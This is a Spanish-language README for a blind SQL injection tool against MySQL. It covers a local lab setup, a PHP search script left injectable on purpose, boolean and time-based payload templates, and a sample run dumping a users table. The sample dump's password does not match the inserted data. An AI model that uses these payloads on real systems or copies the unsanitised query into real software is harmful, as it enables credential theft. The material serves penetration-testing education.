# Blind SQLi - Herramienta de Inyeccion SQL a Ciegas

Herramienta interactiva de Blind SQL Injection para enumeracion completa de bases de datos MySQL. Soporta dos tipos de inyeccion (numerica y string) y dos metodos de deteccion (status code y time-based).

## Requisitos

Instalamos `mariadb-server` , `apache2` y `php-mysql` para montarnos nuestro propio lab.

```bash
sudo apt install -y mariadb-server apache2 php-mysql
```

Instalamos dependencias de `Python`.
```bash
pip install requests pwntools
```

---

## Laboratorio de pruebas

Ahora lanzamos `mysql`:

```bash
service mysql start
```

Comprobamos que esta corriendo:

```bash
service mysql status
```

Adicionalmente, verificamos si el puerto esta en escucha:

```bash
sudo ss -ltnp | grep 3306
```

---

Vamos a empezar creando una `db` para nuestro lab, en `mysql` :

```bash
sudo mysql
```
Una vez dentro de `mysql`

```bash
create database Pwned;
```

Usamos la `db` que hemos creado:

```bash
use Pwned;
```

Creamos una tabla:

```bash
create table users(id int(32), username varchar(32), password varchar(32));
```

Ahora introducimos datos:

```bash
insert into users(id, username, password) values(1, 'admin', 'admin123$!p@$$');
```

```bash
insert into users(id, username, password) values(2, 'amis13', 'amis1331!');
```

```bash
insert into users(id, username, password) values(3, 'omar', 'ommarelhacker1313');
```

---

Como vamos a crear un script en `PHP`, necesitamos ejecutar este comando para crear un usuario pero a nivel de `mysql` para que ese usuario pueda ejecutar el script:

```bash
create user 'amis13'@'localhost' identified by 'amis1331';
```

Ahora le damos privilegios al usuario:

```bash
grant all privileges on Pwned.* to 'amis13'@'localhost';
```

Salimos de `mysql` :

```bash
exit
```

---

Vamos a cerciorarnos de que `Apache` esta corriendo:

```bash
service apache2 status
```

Si no esta corriendo lo levantamos:

```bash
service apache2 start
```

---

Crea el siguiente script PHP en `/var/www/html/searchUsers.php`:
> Debes poner `$username`, `$password` y `$database` acorde a tu configuración, si has usado otros nombres/password.

```php
<?php
$server = "localhost";
$username = "amis13";
$password = "amis1331";
$database = "Pwned";

$conn = new mysqli($server, $username, $password, $database);
$id = $_GET['id'] ?? '';
$data = mysqli_query($conn, "SELECT username FROM users WHERE id = '$id'");
$response = mysqli_fetch_array($data);

if ($response) {
    echo $response['username'];
} else {
    echo "No hay resultados";
}
```

> La query del servidor usa comillas simples (`WHERE id = '$id'`), por lo que el tipo de inyeccion correcto es **String**.

---

## Uso

```bash
python3 status_code/sqli.py
```

La herramienta pedira de forma interactiva:

1. **URL objetivo** - Endpoint vulnerable (ej: `http://localhost/searchUsers.php`)
2. **Parametro vulnerable** - Parametro inyectable (ej: `id`)
3. **Tipo de inyeccion** - Numerica o String
4. **Metodo de deteccion** - Conditional (Status Code) o Time-Based (Sleep)

---

## Tipos de inyeccion

### Numerica

Para cuando la query del servidor **no entrecomilla** el parametro:

```sql
-- Query del servidor:
SELECT * FROM users WHERE id = [input]

-- Payload generado:
?id=9 or ascii(substring((query),1,1))=72
```

### String

Para cuando la query del servidor **entrecomilla** el parametro con comilla simple:

```sql
-- Query del servidor:
SELECT * FROM users WHERE id = '[input]'

-- Payload generado (cierra comilla y comenta el resto):
?id=-1' or ascii(substring((query),1,1))=72-- -
```

---

## Metodos de deteccion

### Conditional (Status Code)

Determina si la condicion es verdadera basandose en el **codigo de respuesta HTTP** (200 = true).

> Requiere que la aplicacion devuelva un status code diferente cuando no hay resultados.

### Time-Based (Sleep)

Determina si la condicion es verdadera midiendo el **tiempo de respuesta** del servidor. Si tarda mas de lo normal, la condicion es verdadera.

> Funciona en practicamente cualquier escenario siempre que la query sea vulnerable.

### Combinaciones posibles

| Tipo | Metodo | Payload ejemplo |
|------|--------|-----------------|
| Numerica | Conditional | `9 or ascii(...)=72` |
| Numerica | Time | `1 and if(ascii(...)=72,sleep(0.35),1)` |
| String | Conditional | `-1' or ascii(...)=72-- -` |
| String | Time | `1' and if(ascii(...)=72,sleep(0.35),1)-- -` |

---

## Verificacion automatica

Antes de iniciar la fuerza bruta, la herramienta **verifica que la inyeccion funciona** enviando dos condiciones:

- **TRUE**: `or 1=1` (debe devolver resultado positivo)
- **FALSE**: `or 1=2` (debe devolver resultado negativo)

Si ambas devuelven el mismo resultado, la combinacion tipo/metodo no funciona y la herramienta avisa para que pruebes otra.

```
[*] Verificando que la inyeccion funciona...
[+] Inyeccion verificada correctamente (TRUE=diferente de FALSE)
```

```
[-] La inyeccion no funciona con este tipo/metodo (TRUE=True, FALSE=True)
[*] Prueba con otro tipo (numerica/string) o metodo (conditional/time)
```

---

## Flujo de enumeracion

```
Verificacion
    |
    +-- Bases de datos (information_schema.schemata)
            |
            +-- Seleccionar base de datos
                    |
                    +-- Listar tablas (information_schema.tables)
                            |
                            +-- Seleccionar tabla
                                    |
                                    +-- Listar columnas (information_schema.columns)
                                            |
                                            +-- Dump de todos los datos
```

---

## Tecnicas utilizadas

- **Fuerza bruta caracter a caracter** - Compara cada posicion con codigos ASCII (33-126)
- **Valores en hexadecimal** - Los nombres de DB/tabla se convierten a hex para evitar conflictos de comillas dentro de la inyeccion
- **group_concat con separador hex** - Usa `separator 0x2c` (coma en hex) para concatenar multiples resultados en un solo string
- **Verificacion previa** - Test automatico TRUE/FALSE antes de empezar para no perder tiempo con una configuracion incorrecta

---

## Ejemplo

```
  ____  _ _           _   ____   ___  _     _
 | __ )| (_)_ __   __| | / ___| / _ \| |   (_)
 |  _ \| | | '_ \ / _` | \___ \| | | | |   | |
 | |_) | | | | | | (_| |  ___) | |_| | |___| |
 |____/|_|_|_| |_|\__,_| |____/ \__\_\_____|_|

        [ Blind SQL Injection Tool ]
        [    Status Code & Time    ]
        By amis13 (https://github.com/amis13)

[?] URL objetivo: http://localhost/searchUsers.php
[?] Parametro vulnerable: id
[?] Selecciona tipo (1/2): 2     # String
[?] Selecciona metodo (1/2): 2   # Time-Based

[+] URL:       http://localhost/searchUsers.php
[+] Parametro: id
[+] Tipo:      string
[+] Metodo:    time

[*] Verificando que la inyeccion funciona...
[+] Inyeccion verificada correctamente (TRUE=diferente de FALSE)

[*] Extrayendo bases de datos...
[+] Bases de datos: information_schema,Pwned

============================================================
  BASES DE DATOS
============================================================
+---+--------------------+
| # | Database           |
+---+--------------------+
| 1 | information_schema |
| 2 | Pwned             |
+---+--------------------+

Selecciona una base de datos: 2

[+] Tablas [Pwned]: users

Selecciona una tabla: 1
[+] Columnas [users]: id,username,password

[*] Dumpeando todas las columnas de 'users'...

============================================================
  DUMP DE 'Pwned.users'
============================================================
+---+----+----------+----------+
| # | id | username | password |
+---+----+----------+----------+
| 1 | 1  | admin    | s3cr3t   |
+---+----+----------+----------+

[+] Extraccion completada
```

## Estructura

```
sqli/
├── README.md
└── status_code/
    ├── sqli.py                # Herramienta principal
```

---

## Disclaimer

Esta herramienta es solo para fines educativos y pruebas de penetracion autorizadas. El uso indebido contra sistemas sin autorizacion es ilegal.

---

## Autor

**amis13** - [https://github.com/amis13](https://github.com/amis13)
